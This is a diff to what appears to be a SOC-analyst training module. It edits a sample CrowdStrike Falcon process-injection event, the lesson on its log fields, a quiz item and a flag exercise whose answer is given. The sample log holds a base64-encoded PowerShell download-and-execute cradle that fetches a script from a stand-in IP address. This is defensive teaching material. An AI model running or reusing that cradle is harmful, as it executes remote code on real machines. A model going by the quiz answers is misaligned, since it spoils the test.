@@ -5,12 +5,12 @@ const edrInjectEvent: TelemetryEvent = {
   ts: "2024-09-18T11:27:44.000Z",
   source: "edr",
   vendor: "CrowdStrike Falcon",
-  event_type: "edr_alert",
+  event_type: "process_access",
   severity: "critical",
   hostname: "WS-EXEC-022",
   user_email: "d.sharon@wrenfield-vets.example",
   description:
-    "Falcon detection on WS-EXEC-022: powershell.exe opened a handle to another process with elevated access rights",
+    "Falcon handle-operation record on WS-EXEC-022: powershell.exe opened a handle to another process with elevated access rights",
   mitre_technique: "T1055.002",
   mitre_tactic: "Stealth",
   process: {
@@ -24,36 +24,28 @@ const edrInjectEvent: TelemetryEvent = {
     user: "WRENFIELD\\d.sharon",
     integrity: "high" as const,
   },
+  // The handle-operation record Falcon logs with the detection (FDR FalconProcessHandleOpDetectInfo).
+  // It is the Falcon event that names the opened process and the requested access mask; the
+  // DetectionSummaryEvent carries neither (Elastic crowdstrike integration, falcon + fdr data streams).
   raw: {
     "event.module": "crowdstrike",
-    "event.dataset": "crowdstrike.falcon",
-    "crowdstrike.EventType": "DetectionSummaryEvent",
-    "crowdstrike.DetectId": "ldt:a7d93e1c4f0b28d65e3c91f7b04a2d68:9988776655",
-    "crowdstrike.DetectDescription":
-      "A process opened a handle to another running process with elevated access rights",
-    "crowdstrike.Tactic": "Stealth",
-    "threat.tactic.id": "TA0005",
-    "crowdstrike.Technique": "Process Injection",
-    "threat.technique.id": "T1055",
-    "crowdstrike.Severity": "5",
-    "crowdstrike.SeverityName": "Critical",
+    "event.dataset": "crowdstrike.fdr",
+    "crowdstrike.event_simpleName": "FalconProcessHandleOpDetectInfo",
+    "crowdstrike.event_platform": "Win",
+    "crowdstrike.aid": "a7d93e1c4f0b28d65e3c91f7b04a2d68",
     "crowdstrike.ComputerName": "WS-EXEC-022",
     "crowdstrike.UserName": "d.sharon",
-    "crowdstrike.ProcessId": "9944",
-    "crowdstrike.FileName": "powershell.exe",
-    "crowdstrike.FilePath": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
+    "crowdstrike.ContextProcessId": "9988776655",
+    "crowdstrike.ImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "crowdstrike.CommandLine":
       "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA5ADMALwBzAC4AcABzADEAJwApAA==",
-    "crowdstrike.ParentImageFileName": "WINWORD.EXE",
-    "crowdstrike.ParentProcessId": "6312",
+    "crowdstrike.ParentImageFileName": "\\Device\\HarddiskVolume3\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "crowdstrike.ParentProcessId": "9988770231",
     "crowdstrike.ParentCommandLine":
       "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n contract_2024.docm",
-    "crowdstrike.TargetProcessId": "3128",
+    "crowdstrike.TargetProcessId": "9988752018",
+    "crowdstrike.TargetProcessImageFileName": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",
     "crowdstrike.DesiredAccess": "2097151",
-    "crowdstrike.IOCType": "hash_sha256",
-    "crowdstrike.IOCValue":
-      "dac329790fca469eb74d69310f84a01a02a9658f88d962fde3e943dde7569b6f",
-    "crowdstrike.NetworkContainmentState": "Not Contained",
   },
 };
 
@@ -456,7 +448,7 @@ const avVsEdrMasterclass = {
         "The most important conceptual distinction in CrowdStrike is IOC versus IOA:\n\n" +
         "IOC (Indicator of Compromise): Something known-bad, a specific file hash, a known malicious IP address, or a known malicious domain. IOC matching is essentially the same as signature detection. Fast and accurate for known threats, blind to new ones.\n\n" +
         "IOA (Indicator of Attack): A behavioral pattern that indicates an attack is in progress, regardless of whether the specific tools or files are known. An IOA says 'a process is injecting into lsass.exe with full access'. It does not care what the injecting process is called or whether its hash is in any database. IOAs detect the behavior of the attack, not the identity of the malware.\n\n" +
-        "Key log fields you will encounter in SIEM when working with CrowdStrike events: crowdstrike.EventType identifies the category of event (DetectionSummaryEvent for alerts). crowdstrike.DetectId is the unique detection identifier in the format ldt:hexstring:number. crowdstrike.DetectDescription is the human-readable description of what was detected. crowdstrike.Severity is the numeric severity on a five-level scale (1=Informational, 2=Low, 3=Medium, 4=High, 5=Critical), and crowdstrike.SeverityName carries the matching label. crowdstrike.Tactic and crowdstrike.Technique map to MITRE ATT&CK. crowdstrike.FileName is the process that triggered the detection. crowdstrike.CommandLine is the full command line of that process. crowdstrike.ParentImageFileName is the parent process. crowdstrike.DesiredAccess is the Windows access rights mask requested when opening another process's handle, written in decimal (2097151 = 0x1FFFFF).",
+        "Key log fields you will encounter in SIEM when working with CrowdStrike events: crowdstrike.EventType identifies the category of event (DetectionSummaryEvent for alerts). crowdstrike.DetectId is the unique detection identifier in the format ldt:hexstring:number. crowdstrike.DetectDescription is the human-readable description of what was detected. crowdstrike.Severity is the numeric severity on a five-level scale (1=Informational, 2=Low, 3=Medium, 4=High, 5=Critical), and crowdstrike.SeverityName carries the matching label. crowdstrike.Tactic and crowdstrike.Technique map to MITRE ATT&CK. crowdstrike.FileName is the process that triggered the detection. crowdstrike.CommandLine is the full command line of that process. crowdstrike.ParentImageFileName is the parent process. The detection does not name the process that was opened or the access requested: those live on the handle-operation record Falcon logs with it (event_simpleName FalconProcessHandleOpDetectInfo, found in the host's event search). There, crowdstrike.TargetProcessImageFileName is the opened process and crowdstrike.DesiredAccess is the Windows access rights mask requested for its handle, written in decimal (2097151 = 0x1FFFFF).",
       codeExample:
         "CROWDSTRIKE FALCON DETECTION EVENT: SIEM LOG FIELDS\n" +
         "======================================================\n\n" +
@@ -481,15 +473,20 @@ const avVsEdrMasterclass = {
         '  "crowdstrike.CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA...",\n' +
         '  "crowdstrike.ParentImageFileName": "WINWORD.EXE",\n' +
         '  "crowdstrike.ParentCommandLine": "WINWORD.EXE /n contract_2024.docm",\n\n' +
-        "  // Injection target\n" +
-        '  "crowdstrike.TargetProcessId": "3128",\n' +
-        '  "crowdstrike.DesiredAccess": "2097151",  // PROCESS_ALL_ACCESS\n\n' +
         "  // IOC\n" +
         '  "crowdstrike.IOCType": "hash_sha256",\n' +
         '  "crowdstrike.IOCValue": "722ca33845720a1f26e4e12852450b4f...",\n\n' +
         "  // Host context\n" +
         '  "crowdstrike.NetworkContainmentState": "Not Contained",\n' +
         '  \n' +
+        "}\n\n" +
+        "THE HANDLE-OPERATION RECORD LOGGED WITH IT (event search)\n" +
+        "======================================================\n\n" +
+        "{\n" +
+        '  "crowdstrike.event_simpleName": "FalconProcessHandleOpDetectInfo",\n' +
+        '  "crowdstrike.ImageFileName": "\\Device\\HarddiskVolume3\\...\\powershell.exe",\n' +
+        '  "crowdstrike.TargetProcessImageFileName": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",\n' +
+        '  "crowdstrike.DesiredAccess": "2097151",  // PROCESS_ALL_ACCESS\n' +
         "}\n\n" +
         "SEVERITY SCALE:\n" +
         "  1 = Informational (context only)\n" +
@@ -638,7 +635,7 @@ const avVsEdrMasterclass = {
       type: "question" as const,
       id: "edr-q3",
       question:
-        "What does an access mask of 0x1FFFFF (Falcon's crowdstrike.DesiredAccess 2097151) mean in a CrowdStrike EDR alert about LSASS access?",
+        "What does an access mask of 0x1FFFFF (Falcon's crowdstrike.DesiredAccess 2097151) mean in the CrowdStrike handle-operation record behind an LSASS-access detection?",
       options: [
         "PROCESS_VM_READ only: the process can read LSASS memory but cannot write to it or create threads in it",
         "PROCESS_ALL_ACCESS was requested: the process asked for full control over LSASS, enough to dump its credential material",
@@ -707,7 +704,7 @@ const avVsEdrMasterclass = {
       id: "edr-la1",
       heading: "CrowdStrike Alert: PowerShell Injecting into Explorer.exe",
       context:
-        "You are a Tier-1 SOC analyst at Wrenfield Veterinary Group. A CrowdStrike Falcon detection fires on WS-EXEC-022, a head-office executive's workstation. The host's process list shows PID 3128 is explorer.exe. Work out what happened from the record.",
+        "You are a Tier-1 SOC analyst at Wrenfield Veterinary Group. A Critical CrowdStrike Falcon detection fires on WS-EXEC-022, a head-office executive's workstation, tagged Stealth / Process Injection (T1055). The record below is the handle-operation event Falcon logged with it (FalconProcessHandleOpDetectInfo, from the host's event search). Work out what happened from the record.",
       event: edrInjectEvent,
       questions: [
         {
@@ -761,7 +758,7 @@ const avVsEdrMasterclass = {
       id: "edr-f1",
       event: edrInjectEvent, // show the CrowdStrike log this flag reads (not the nearest analyst_choice)
       prompt:
-        "In the CrowdStrike detection, three processes are involved: the Office parent, the PowerShell process, and the process PowerShell opened. After the injection, the attacker's code is running inside one of them. Enter that process's PID.",
+        "In the CrowdStrike record, three processes are involved: the Office parent, the PowerShell process, and the process PowerShell opened. After the injection, the attacker's code is running inside one of them. The host's process list shows WINWORD.EXE as PID 6312, powershell.exe as PID 9944 and explorer.exe as PID 3128. Enter the PID of the process the code now runs in.",
       answer: "3128",
       hint: "It is not the process that made the request, and not its parent.",
       xp: 30,
